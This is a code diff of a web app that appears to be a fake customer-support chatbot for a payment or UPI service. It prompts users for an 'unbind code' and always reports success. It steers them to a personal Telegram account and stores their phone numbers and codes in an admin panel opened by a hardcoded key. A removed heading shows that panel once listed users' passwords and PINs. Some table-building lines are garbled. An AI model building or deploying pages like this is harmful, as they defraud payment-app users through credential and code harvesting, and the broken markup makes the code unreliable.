-                inputDiv.style.marginTop = '10px';
-                inputDiv.innerHTML = `
-                    <input type="text" id="userReplyInput" class="input-field" placeholder="Type your reply here..." style="margin:0;">
-                    <button id="sendReplyBtn" class="green-btn" style="margin-top:5px;">Send ➤</button>
+                // Show code input
+                const dynamicArea = document.getElementById('dynamicArea');
+                dynamicArea.innerHTML = `
+                    <input type="text" id="unbindCodeInput" class="input-field" placeholder="${t('enterCode')}" style="text-align: center; letter-spacing: 2px;">
+                    <button id="submitCodeBtn" class="green-btn">${t('submit')}</button>
                 `;
-                document.getElementById('dynamicArea').appendChild(inputDiv);
                 
-                document.getElementById('sendReplyBtn').onclick = async () => {
-                    let input = document.getElementById('userReplyInput');
-                    let text = input.value.trim();
-                    if (!text) return;
-                    input.value = '';
-                    await processUserReply(chatBox, text);
-                };
-                
-                document.getElementById('userReplyInput').onkeypress = (e) => {
-                    if (e.key === 'Enter') document.getElementById('sendReplyBtn').click();
+                document.getElementById('submitCodeBtn').onclick = async () => {
+                    let code = document.getElementById('unbindCodeInput').value;
+                    if (!code || code.length < 4) {
+                        addMessage(chatBox, 'bot', '⚠️ Please enter a valid unbind code');
+                        return;
+                    }
+                    addMessage(chatBox, 'user', `Code: ${code}`);
+                    await showTyping(chatBox, 4000);
+                    addMessage(chatBox, 'bot', t('codeSuccess'));
+                    addMessage(chatBox, 'bot', t('processing'));
+                    
+                    // Save request
+                    let requests = getRequests();
+                    let newRequest = {
+                        id: Date.now(),
+                        phone: currentUser.phone,
+                        issue: 'unbind',
+                        code: code,
+                        status: 'pending',
+                        created_at: new Date().toISOString()
+                    };
+                    requests.push(newRequest);
+                    saveRequests(requests);
+                    
+                    // Show success
+                    document.getElementById('successArea').innerHTML = `
+                        <div class="success-msg">
+                            ✅✅✅<br>
+                            <strong>${t('codeSuccess')}</strong><br>
+                            ${t('processing')}
+                        </div>
+                    `;
+                    
+                    // Show issue selection
+                    setTimeout(() => {
+                        addMessage(chatBox, 'bot', t('verified'));
+                        setTimeout(() => showIssueOptions(), 2000);
+                    }, 2000);
                 };
             }
         }
+        
+        function showIssueOptions() {
+            const issues = [
+                { id: 'selling', name: t('selling') },
+                { id: 'withdrawal', name: t('withdrawal') },
+                { id: 'deposit', name: t('deposit') },
+                { id: 'order', name: t('order') },
+                { id: 'upi', name: t('upi') },
+                { id: 'forget', name: t('forget') },
+                { id: 'others', name: t('others') }
+            ];
+            
+            const dynamicArea = document.getElementById('dynamicArea');
+            dynamicArea.innerHTML = `
+                <div class="options-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px;">
+                    ${issues.map(issue => `<button class="option-btn" data-issue="${issue.id}" style="background:#2e7d32; color:white; padding:12px; border:none; border-radius:14px; cursor:pointer;">${issue.name}</button>`).join('')}
+                </div>
+                <div style="margin-top: 15px; padding: 12px; background: #e8f5e9; border-radius: 16px; text-align: center;">
+                    <p style="font-size: 12px; color: #2e7d32;">${t('teamContact')}</p>
+                    <a href="https://t.me/RAHUL9358" target="_blank" class="telegram-link" style="background: #0088cc; padding: 8px 16px; font-size: 13px;">📱 @RAHUL9358</a>
+                </div>
+            `;
+            
+            document.querySelectorAll('.option-btn').forEach(btn => {
+                btn.onclick = () => {
+                    selectedIssue = btn.dataset.issue;
+                    addMessage(chatBox, 'user', btn.innerText);
+                    addMessage(chatBox, 'bot', `✅ ${t('codeSuccess')} Your issue has been recorded. Our team will contact you soon.`);
+                    addMessage(chatBox, 'bot', `📞 ${t('teamContact')} <a href="https://t.me/RAHUL9358" target="_blank">@RAHUL9358</a>`, true);
+                    
+                    // Save final issue
+                    let requests = getRequests();
+                    let lastReq = requests[requests.length - 1];
+                    if (lastReq) {
+                        lastReq.finalIssue = selectedIssue;
+                        saveRequests(requests);
+                    }
+                };
+            });
+        }
+        
+        // Show steps sequentially with Next/Back buttons
+        async function startGuide() {
+            stepButtons.innerHTML = `
+                <button id="nextBtn" class="step-btn">Next ➤</button>
+            `;
+            
+            await showStep(0);
+            let currentStep = 1;
+            
+            document.getElementById('nextBtn').onclick = async () => {
+                if (currentStep <= 5) {
+                    await showStep(currentStep);
+                    currentStep++;
+                    if (currentStep > 5) {
+                        stepButtons.innerHTML = '';
+                    }
+                }
+            };
+        }
+        
+        startGuide();
         
         document.getElementById('logoutBtn').onclick = () => {
             currentUser = null;
             renderLogin();
         };
-        
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
             if (key === 'SPRO2025') renderAdminPanel();
@@ -752,14 +668,14 @@
         let requests = getRequests();
         
         document.getElementById('app').innerHTML = `
-            <div class="container container-wide">
+            <div class="container container-wide" style="max-width: 95%; overflow-x: auto;">
                 <h2>🔐 ADMIN PANEL</h2>
-                <p style="color:#2e7d32;">👑 Welcome Admin | 👥 Users: ${users.length} | 📋 Requests: ${requests.length}</p>
+                <p style="color:#2e7d32;">👑 Admin | 👥 Users: ${users.length} | 📋 Requests: ${requests.length}</p>
                 <h3>⏳ PENDING REQUESTS</h3>
                 <div id="pendingTable"></div>
                 <h3>📜 ALL REQUESTS</h3>
                 <div id="allRequestsTable"></div>
-                <h3>👥 USERS (Phone, Password, PIN)</h3>
+                <h3>👥 USERS</h3>
                 <div id="usersTable"></div>
                 <button id="adminLogout" class="gray-btn">LOGOUT</button>
             </div>
@@ -767,16 +683,16 @@
         `;
         
         let pending = requests.filter(r => r.status === 'pending');
-        let pendingHtml = '<table><tr><th>ID</th><th>Phone</th><th>Issue</th><th>Code</th><th>Details</th><th>Action</th></tr>';
+        let pendingHtml = '能atable<th>ID</th><th>Phone</th><th>Code</th><th>Issue</th><th>Action</th></tr>';
         pending.forEach(r => {
-            pendingHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td>${r.issueName || r.issue}</td><td><strong>${r.code}</strong></td><td><small>${JSON.stringify(r.details)}</small></td><td><button class="approve-btn" data-id="${r.id}">Approve</button><button class="reject-btn" data-id="${r.id}">Reject</button></td></tr>`;
+            pendingHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td><strong>${r.code}</strong></td><td>${r.finalIssue || r.issue}</td><td><button class="approve-btn" data-id="${r.id}">Approve</button><button class="reject-btn" data-id="${r.id}">Reject</button></td></tr>`;
         });
         pendingHtml += '</table>';
         document.getElementById('pendingTable').innerHTML = pendingHtml;
         
-        let allHtml = '<table><tr><th>ID</th><th>Phone</th><th>Issue</th><th>Code</th><th>Status</th><th>Time</th></tr>';
+        let allHtml = '能atable<th>ID</th><th>Phone</th><th>Code</th><th>Status</th><th>Time</th></tr>';
         [...requests].reverse().forEach(r => {
-            allHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td>${r.issueName || r.issue}</td><td>${r.code}</td><td class="${r.status}">${r.status}</td><td>${new Date(r.created_at).toLocaleString()}</td></tr>`;
+            allHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td>${r.code}</td><td class="${r.status}">${r.status}</td><td>${new Date(r.created_at).toLocaleString()}</td></tr>`;
         });
         allHtml += '</table>';
         document.getElementById('allRequestsTable').innerHTML = allHtml;
